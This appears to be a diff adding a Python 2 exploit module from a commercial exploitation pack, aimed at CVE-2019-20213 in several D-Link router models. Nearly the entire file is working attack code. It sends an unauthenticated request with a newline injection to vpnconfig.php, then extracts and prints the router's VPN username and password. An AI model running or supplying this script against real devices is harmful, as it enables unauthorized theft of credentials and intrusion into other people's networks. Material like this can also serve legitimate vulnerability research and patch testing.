@@ -1,0 +1,46 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_dlink_33'
+_vendor_ = 'dlink'
+_model_  = ['DIR-818L', 'DIR-822', 'DIR-823', 'DIR-859', 'DIR-865L', 'DIR-868L', 'DIR-869', 'DIR-880L', 'DIR-890L', 'DIR-885L', 'DIR-895L']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2019-20213'
+_ref_    = 'https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/vpnconfig.php?pwnd=%%0a" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if ("AuthName" in response.text) and ("AuthPassword" in response.text):
+    print '[+] %s vulnerable' % host
+    m = re.search('<key>AuthName</key>\\s*<string>([^<]+)</string>\\s*<key>AuthPassword</key>\\s*<string>([^<]+)</string>', response.text)
+    authname = ''
+    authpasswd = ''    
+    if m is not None:
+        authname = m.group(1)
+        authpasswd = m.group(2)        
+    print('AuthName: %s\nAuthPassword: %s\n\n'%(authname,authpasswd))              
+  else:
+    print '[+] %s not vulnerable' % host    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
